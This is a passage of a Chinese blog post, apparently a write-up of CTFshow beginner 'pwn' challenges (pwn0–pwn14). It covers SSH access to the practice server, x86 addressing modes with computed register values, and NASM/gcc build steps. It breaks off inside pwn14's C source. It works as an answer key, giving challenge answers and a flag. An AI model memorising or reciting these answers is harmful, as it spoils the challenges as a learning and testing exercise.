<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Hsad"><meta name="copyright" content="Hsad"><meta name="generator" content="Hexo 7.2.0"><meta name="theme" content="hexo-theme-yun"><title>pwn入门-前置基础 | Hsad's Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"hsad.xyz","root":"/","title":"所以你弃权","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="从零开始的pwn生活pwn0ssh ctfshow@pwn.challenge.ctf.show -p28184 # 123456  ssh连接会有一段炫酷的画面   pwn1IDA反编译一下附件  nc直接给flag pwn2 太友好了 直接给了shell pwn3  直接选6拿flag pwn4 输入CTFshowPWN getshell 前置基础pwn5运行此文件，将得到的字符串以ctfsh">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn入门-前置基础">
<meta property="og:url" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/index.html">
<meta property="og:site_name" content="Hsad&#39;s Blog">
<meta property="og:description" content="从零开始的pwn生活pwn0ssh ctfshow@pwn.challenge.ctf.show -p28184 # 123456  ssh连接会有一段炫酷的画面   pwn1IDA反编译一下附件  nc直接给flag pwn2 太友好了 直接给了shell pwn3  直接选6拿flag pwn4 输入CTFshowPWN getshell 前置基础pwn5运行此文件，将得到的字符串以ctfsh">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/testnc1.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/testnc2.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/testnc3.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/testnc4.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/testnc4_2.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/testnc5.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/pwn8.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/pwn9.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/pwn9_2.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/pwn10.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/pwn20_checksec.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/pwn20_objdump.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/pwn20.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/pwn21_checksec.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/pwn22_checksec.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/pwn23_checksec.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/pwn23.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/pwn24_checksec.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/pwn25_checksec.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/pwn26_checksec.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/pwn29_chjecksec.png">
<meta property="og:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/pwn30_checksec.png">
<meta property="article:published_time" content="2024-10-08T07:30:28.000Z">
<meta property="article:modified_time" content="2024-10-23T15:15:37.398Z">
<meta property="article:author" content="Hsad">
<meta property="article:tag" content="CTFshow">
<meta property="article:tag" content="Test_your_nc">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/testnc1.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Hsad"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Hsad"><span class="site-author-status" title="凉">☺️</span></a><div class="site-author-name"><a href="/about/">Hsad</a></div><span class="site-name">Hsad's Blog</span><sub class="site-subtitle">一个人的世界</sub><div class="site-description">翻着我们的照片 想念若隐若现</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">42</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">6</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">40</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://qm.qq.com/cgi-bin/qm/qr?k=EYiK7-b5ur1mWxbX7aV2AEBsuoW9c732" title="QQ" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:qq-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/watanabe-hsad" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:dubian.zzy@outlook.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84pwn%E7%94%9F%E6%B4%BB"><span class="toc-number">1.</span> <span class="toc-text">从零开始的pwn生活</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn0"><span class="toc-number">1.1.</span> <span class="toc-text">pwn0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn1"><span class="toc-number">1.2.</span> <span class="toc-text">pwn1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn2"><span class="toc-number">1.3.</span> <span class="toc-text">pwn2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn3"><span class="toc-number">1.4.</span> <span class="toc-text">pwn3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn4"><span class="toc-number">1.5.</span> <span class="toc-text">pwn4</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">前置基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn5"><span class="toc-number">2.1.</span> <span class="toc-text">pwn5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn6-%E7%AB%8B%E5%8D%B3%E5%AF%BB%E5%9D%80"><span class="toc-number">2.2.</span> <span class="toc-text">pwn6(立即寻址)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn7-%E5%AF%84%E5%AD%98%E5%99%A8%E5%AF%BB%E5%9D%80"><span class="toc-number">2.3.</span> <span class="toc-text">pwn7(寄存器寻址)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn8-%E7%9B%B4%E6%8E%A5%E5%AF%BB%E5%9D%80"><span class="toc-number">2.4.</span> <span class="toc-text">pwn8(直接寻址)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn9-%E5%AF%84%E5%AD%98%E5%99%A8%E9%97%B4%E6%8E%A5%E5%AF%BB%E5%9D%80"><span class="toc-number">2.5.</span> <span class="toc-text">pwn9(寄存器间接寻址)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn10-%E5%AF%84%E5%AD%98%E5%99%A8%E7%9B%B8%E5%AF%B9%E5%AF%BB%E5%9D%80"><span class="toc-number">2.6.</span> <span class="toc-text">pwn10(寄存器相对寻址)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn11-%E5%9F%BA%E5%9D%80%E5%8F%98%E5%9D%80%E5%AF%BB%E5%9D%80"><span class="toc-number">2.7.</span> <span class="toc-text">pwn11(基址变址寻址)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn12-%E7%9B%B8%E5%AF%B9%E5%9F%BA%E5%9D%80%E5%8F%98%E5%9D%80%E5%AF%BB%E5%9D%80"><span class="toc-number">2.8.</span> <span class="toc-text">pwn12(相对基址变址寻址)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn13-gcc"><span class="toc-number">2.9.</span> <span class="toc-text">pwn13(gcc)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn14"><span class="toc-number">2.10.</span> <span class="toc-text">pwn14</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn15-nasm"><span class="toc-number">2.11.</span> <span class="toc-text">pwn15(nasm)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn16-gcc-s"><span class="toc-number">2.12.</span> <span class="toc-text">pwn16(gcc .s)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn17"><span class="toc-number">2.13.</span> <span class="toc-text">pwn17</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn18-%E8%BF%BD%E5%8A%A0"><span class="toc-number">2.14.</span> <span class="toc-text">pwn18(&gt;&gt;追加)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn19-1-0"><span class="toc-number">2.15.</span> <span class="toc-text">pwn19(1&gt;&amp;0)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn20-RELRO"><span class="toc-number">2.16.</span> <span class="toc-text">pwn20(RELRO)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn21-Partial-RELRO"><span class="toc-number">2.17.</span> <span class="toc-text">pwn21(Partial RELRO)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn22-Full-RELRO"><span class="toc-number">2.18.</span> <span class="toc-text">pwn22(Full RELRO)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn23-dest"><span class="toc-number">2.19.</span> <span class="toc-text">pwn23(dest)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn24-ret2shellcode"><span class="toc-number">2.20.</span> <span class="toc-text">pwn24(ret2shellcode)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn25-ret2libc"><span class="toc-number">2.21.</span> <span class="toc-text">pwn25(ret2libc)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn26-ASLR"><span class="toc-number">2.22.</span> <span class="toc-text">pwn26(ASLR)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn27"><span class="toc-number">2.23.</span> <span class="toc-text">pwn27</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn28"><span class="toc-number">2.24.</span> <span class="toc-text">pwn28</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn29-PIE"><span class="toc-number">2.25.</span> <span class="toc-text">pwn29(PIE)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn30"><span class="toc-number">2.26.</span> <span class="toc-text">pwn30</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://hsad.xyz/2024/10/08/pwn%E5%85%A5%E9%97%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Hsad"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Hsad's Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">pwn入门-前置基础</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-10-08 15:30:28" itemprop="dateCreated datePublished" datetime="2024-10-08T15:30:28+08:00">2024-10-08</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2024-10-23 23:15:37" itemprop="dateModified" datetime="2024-10-23T23:15:37+08:00">2024-10-23</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">安全相关</span></a></span> > <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/CTF/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTF</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/CTFshow/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">CTFshow</span></a><a class="tag-item" href="/tags/Test-your-nc/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">Test_your_nc</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h3 id="从零开始的pwn生活"><a href="#从零开始的pwn生活" class="headerlink" title="从零开始的pwn生活"></a>从零开始的pwn生活</h3><h4 id="pwn0"><a href="#pwn0" class="headerlink" title="pwn0"></a>pwn0</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> ctfshow@pwn.challenge.ctf.show <span class="token parameter variable">-p28184</span> <span class="token comment"># 123456</span></code></pre>

<p>ssh连接会有一段炫酷的画面 </p>
<p><img src="testnc1.png" loading="lazy"></p>
<h4 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h4><p>IDA反编译一下附件</p>
<p><img src="testnc2.png" loading="lazy"></p>
<p>nc直接给flag</p>
<h4 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h4><p><img src="testnc3.png" loading="lazy"></p>
<p>太友好了 直接给了shell</p>
<h4 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h4><p><img src="testnc4.png" loading="lazy"></p>
<p><img src="testnc4_2.png" loading="lazy"></p>
<p>直接选6拿flag</p>
<h4 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h4><p><img src="testnc5.png" loading="lazy"></p>
<p>输入<code>CTFshowPWN</code> getshell</p>
<h3 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h3><h4 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h4><p>运行此文件，将得到的字符串以ctfshow{xxxxx}提交。</p>
<p>汇编代码</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">section .data
    msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0

section .text
    global _start

_start:

; 立即寻址方式
    mov eax, 11         ; 将11赋值给eax
    add eax, 114504     ; eax加上114504
    sub eax, 1          ; eax减去1

; 寄存器寻址方式
    mov ebx, 0x36d      ; 将0x36d赋值给ebx
    mov edx, ebx        ; 将ebx的值赋值给edx

; 直接寻址方式
    mov ecx, msg      ; 将msg的地址赋值给ecx

; 寄存器间接寻址方式
    mov esi, msg        ; 将msg的地址赋值给esi
    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax

; 寄存器相对寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    add ecx, 4          ; 将ecx加上4
    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax

; 基址变址寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    mov edx, 2          ; 将2赋值给edx
    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax

; 相对基址变址寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    mov edx, 1          ; 将1赋值给edx
    add ecx, 8          ; 将ecx加上8
    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax

; 输出字符串
    mov eax, 4          ; 系统调用号4代表输出字符串
    mov ebx, 1          ; 文件描述符1代表标准输出
    mov ecx, msg        ; 要输出的字符串的地址
    mov edx, 22         ; 要输出的字符串的长度
    int 0x80            ; 调用系统调用

; 退出程序
    mov eax, 1          ; 系统调用号1代表退出程序
    xor ebx, ebx        ; 返回值为0s
    int 0x80            ; 调用系统调用
</code></pre>

<p>使用NASM汇编器和ld链接器编译成可执行文件。</p>
<p>使用以下命令将其编译为对象文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">nasm <span class="token parameter variable">-f</span> elf pwn5_1.asm</code></pre>

<p>这将生成一个名为pwn5_1.o 的对象文件。接下来，使用以下命令将对象文件链接成可执行文件： </p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ld <span class="token parameter variable">-m</span> elf_i386 <span class="token parameter variable">-s</span> <span class="token parameter variable">-o</span> pwn5_1 pwn5_1.o</code></pre>

<p><code>ld</code> 是 Linux 下的链接器，用于将一个或多个对象文件（<code>.o</code> 文件）和库文件链接成可执行文件或库文件。在你提供的命令中：</p>
<ul>
<li><code>ld</code>：链接器程序本身。</li>
<li><code>-m elf_i386</code>：指定生成的目标文件格式为 <code>elf_i386</code>，这是为 32 位 Intel 架构计算机生成的 ELF（Executable and Linkable Format）格式。</li>
<li><code>-s</code>：这个选项告诉链接器在生成的可执行文件中剥离所有符号信息。这通常用于减少可执行文件的大小，并且可能用于安全目的，以防止某些类型的逆向工程。</li>
<li><code>-o pwn5_1</code>：指定输出文件的名称为 <code>pwn5_1</code>。</li>
<li><code>pwn5_1.o</code>：这是要链接的对象文件。</li>
</ul>
<p>这将生成一个名为 pwn5_1 的可执行文件  (事实上题目附件第二个就是)</p>
<p>运行pwn5_1或者pwn5_2即可</p>
<h4 id="pwn6-立即寻址"><a href="#pwn6-立即寻址" class="headerlink" title="pwn6(立即寻址)"></a>pwn6(立即寻址)</h4><p>立即寻址方式结束后eax寄存器的值为？</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">立即寻址方式
    mov eax, 11         ; 将11赋值给eax
    add eax, 114504     ; eax加上114504
    sub eax, 1          ; eax减去1</code></pre>

<p>11+114504-1&#x3D;114514</p>
<h4 id="pwn7-寄存器寻址"><a href="#pwn7-寄存器寻址" class="headerlink" title="pwn7(寄存器寻址)"></a>pwn7(寄存器寻址)</h4><p>寄存器寻址方式结束后edx寄存器的值为？</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">寄存器寻址方式
    mov ebx, 0x36d      ; 将0x36d赋值给ebx
    mov edx, ebx        ; 将ebx的值赋值给edx</code></pre>

<p>0x36D</p>
<h4 id="pwn8-直接寻址"><a href="#pwn8-直接寻址" class="headerlink" title="pwn8(直接寻址)"></a>pwn8(直接寻址)</h4><p>直接寻址方式结束后ecx寄存器的值为？</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">section .data
    msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0
直接寻址方式
    mov ecx, [msg]      ; 将msg的地址赋值给ecx</code></pre>

<p><img src="pwn8.png" loading="lazy"></p>
<p>0x80490E8</p>
<h4 id="pwn9-寄存器间接寻址"><a href="#pwn9-寄存器间接寻址" class="headerlink" title="pwn9(寄存器间接寻址)"></a>pwn9(寄存器间接寻址)</h4><p>寄存器间接寻址方式结束后eax寄存器的值为？</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">寄存器间接寻址方式
    mov esi, msg        ; 将msg的地址赋值给esi
    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</code></pre>

<p><img src="pwn9.png" loading="lazy"></p>
<p><img src="pwn9_2.png" loading="lazy"></p>
<p>0x636C6557</p>
<h4 id="pwn10-寄存器相对寻址"><a href="#pwn10-寄存器相对寻址" class="headerlink" title="pwn10(寄存器相对寻址)"></a>pwn10(寄存器相对寻址)</h4><p>寄存器相对寻址方式结束后eax寄存器的值为？</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">寄存器相对寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    add ecx, 4          ; 将ecx加上4
    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</code></pre>

<p><img src="pwn10.png" loading="lazy"></p>
<p>080490E8+4&#x3D;080490EC  “ome_to_CTFshow_PWN”</p>
<h4 id="pwn11-基址变址寻址"><a href="#pwn11-基址变址寻址" class="headerlink" title="pwn11(基址变址寻址)"></a>pwn11(基址变址寻址)</h4><p>基址变址寻址方式结束后的eax寄存器的值为？</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">基址变址寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    mov edx, 2          ; 将2赋值给edx
    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</code></pre>

<p>080490E8+2*2&#x3D;080490EC  “ome_to_CTFshow_PWN”</p>
<h4 id="pwn12-相对基址变址寻址"><a href="#pwn12-相对基址变址寻址" class="headerlink" title="pwn12(相对基址变址寻址)"></a>pwn12(相对基址变址寻址)</h4><p>相对基址变址寻址方式结束后eax寄存器的值为？</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">相对基址变址寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    mov edx, 1          ; 将1赋值给edx
    add ecx, 8          ; 将ecx加上8
    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</code></pre>

<p>080490E8+8+1*2-6&#x3D;080490EC “ome_to_CTFshow_PWN”</p>
<h4 id="pwn13-gcc"><a href="#pwn13-gcc" class="headerlink" title="pwn13(gcc)"></a>pwn13(gcc)</h4><p>如何使用GCC？编译运行后即可获得flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gcc flag.c <span class="token parameter variable">-o</span> flag
./flag
ctfshow<span class="token punctuation">&#123;</span>hOw_t0_us3_GCC?<span class="token punctuation">&#125;</span></code></pre>

<h4 id="pwn14"><a href="#pwn14" class="headerlink" title="pwn14"></a>pwn14</h4><p>请你阅读以下源码，给定key为”CTFshow”，编译运行即可获得flag</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFFER_SIZE</span> <span class="token expression"><span class="token number">1024</span></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> buffer<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token class-name">size_t</span> n<span class="token punctuation">;</span>
